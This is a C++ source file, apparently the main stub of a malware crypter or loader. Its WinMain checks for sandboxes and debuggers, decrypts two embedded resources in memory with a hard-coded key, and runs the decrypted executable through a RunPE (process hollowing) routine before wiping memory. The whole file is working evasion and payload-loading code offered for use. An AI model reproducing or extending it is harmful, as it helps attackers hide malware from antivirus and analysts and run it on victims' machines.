#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include "targetver.h"
#include <vector>

#include "Cryptor.h"
#include "AntiAnalysis.h"
#include "MemoryManager.h"
#include "Runpe.h"
#include "Key.h"
#include <random>


bool ReadResource(int id, std::vector<unsigned char>& data);
int GetRandom(int min, int max);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {

    AntiAnalysis::EvadeSandbox();
    if (AntiAnalysis::IsDebugged()) {
        return 0;
    }

    std::vector<unsigned char> settings, file_bytes;

    if (ReadResource(1, settings) && !settings.empty()) {
        QuantumDecryptor::DecryptInMemory(key, settings);
    }

    if (ReadResource(2, file_bytes) && !file_bytes.empty()) {
        QuantumDecryptor::DecryptInMemory(key, file_bytes);
    }

    if (!file_bytes.empty()) {
        bool useDebug = !settings.empty() && settings[0];
        RunPortableExecutable(file_bytes.data(), useDebug);
    }

    GhostMemory::SecureErase(settings);
    GhostMemory::SecureErase(file_bytes);
    GhostMemory::Cleanup();

    return 0;
}

bool ReadResource(int id, std::vector<unsigned char>& data) {
    HRSRC hResource = FindResource(nullptr, MAKEINTRESOURCE(id), RT_RCDATA);
    if (!hResource) return false;

    HGLOBAL hGlobal = LoadResource(nullptr, hResource);
    if (!hGlobal) return false;

    DWORD size = SizeofResource(nullptr, hResource);
    if (size == 0) return false;

    void* resourceData = LockResource(hGlobal);
    if (!resourceData) return false;

    data.resize(size);
    memcpy(data.data(), resourceData, size);
    FreeResource(hGlobal);

    return true;
}

int GetRandom(int min, int max) {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(min, max);
    return dist(gen);
}